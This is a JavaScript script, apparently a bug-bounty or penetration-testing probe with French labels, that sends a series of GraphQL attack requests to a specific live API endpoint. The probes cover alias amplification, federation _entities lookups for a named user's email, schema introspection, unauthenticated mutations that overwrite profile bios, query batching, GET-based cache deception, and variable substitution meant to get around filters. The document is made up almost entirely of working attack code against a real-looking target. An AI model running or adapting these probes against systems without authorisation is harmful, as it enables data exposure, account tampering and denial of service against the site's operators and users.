const AS="https://bugsecure-api.senintel.sn", EP=AS+"/graphql";
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
async function F(u,o={}){let e=null;for(let a=0;a<3;a++){try{return await fetch(u,{...o,signal:AbortSignal.timeout(30000)});}catch(x){e=x;await sleep(2000);}}return null;}
async function gql(q,v){const r=await F(EP,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(typeof q==="string"?{query:q,variables:v}:{query:q,variables:v})});const t=r?await r.text():"ERR";let j=null;try{j=JSON.parse(t)}catch{};return{s:r?.status??0,j,t};}
const show=(l,r)=>{const e=r.j?.errors?("ERR: "+r.j.errors.map(x=>x.message).join(" | ")):(r.j?.data!==undefined?JSON.stringify(r.j.data):String(r.t).replace(/\s+/g," "));console.log("  "+l.padEnd(44)+"HTTP "+r.s+"  "+String(e).slice(0,170));};
console.log("=== B) alias abuse / federation / introspection ===");
const tests=[
 ["alias simple",`{ a: me { id } b: me { id } }`],
 ["alias x20",Array.from({length:20},(_,i)=>`a${i}: me { id }`).join(" ")],
 ["alias + champs differents",`{ a: me { id } b: me { id } c: me { id email } }`],
 ["alias sur un champ inexistant",`{ a: me { id } zz: nonexistent { x } }`],
 ["federation _service",`{ _service { sdl } }`],
 ["federation _entities",`{ _entities(representations: [{__typename:"User", id:"e3aa51e2-2c87-4b64-a3cb-6d5eb857f40c"}]) { ... on User { id username email } } }`],
 ["__typename",`{ __typename }`],
 ["__type(User)",`{ __type(name:"User"){ name fields { name } } }`],
 ["__schema",`{ __schema { types { name } } }`],
 ["mutation sans auth",`mutation { updateResearcherProfile(input:{bio:"bb-alias-probe"}) { id } }`],
 ["mutation alias x5",`mutation { a: updateResearcherProfile(input:{bio:"bb-a"}){id} b: updateResearcherProfile(input:{bio:"bb-b"}){id} c: updateResearcherProfile(input:{bio:"bb-c"}){id} }`],
];
for(const [l,q] of tests){show(l,await gql(q));await sleep(700);}
console.log("\n=== B2) batching ===");
let rb=await gql(JSON.stringify([{query:"{ me { id } }"},{query:"{ __typename }"},{query:"{ me { id } }"}]));
console.log("  array de 3 operations      HTTP "+rb.s+"  "+String(rb.j?JSON.stringify(rb.j):rb.t).replace(/\s+/g," ").slice(0,200));
await sleep(600);
rb=await gql(`{ a: me { id } }\n{ b: me { id } }`);
console.log("  2 operations dans 1 corps  HTTP "+rb.s+"  "+String(rb.j?JSON.stringify(rb.j):rb.t).replace(/\s+/g," ").slice(0,200));
await sleep(600);
console.log("\n=== B3) GET /graphql (cache deception) ===");
for(const q of ["{ me { id email } }","{ __typename }","{ me { id } }"]){
 const g=await F(EP+"?query="+encodeURIComponent(q)); const t=g?await g.text():"ERR";
 console.log("  GET ?query="+q.padEnd(24)+" HTTP "+(g?.status??0)+"  "+t.replace(/\s+/g," ").slice(0,150));
 await sleep(600);
}
console.log("\n=== B4) variables au lieu de litteraux (contournement d'un filtre par nom de champ ?) ===");
show("mutation avec $bio variable",await gql(`mutation($b:String!){ updateResearcherProfile(input:{bio:$b}){ id } }`,{b:"bb-var-probe"}));
await sleep(600);
show("mutation nom en camelCase different",await gql(`mutation{ updateResearcherProfile(input:{bio:"bb-camel"}){ id } }`));
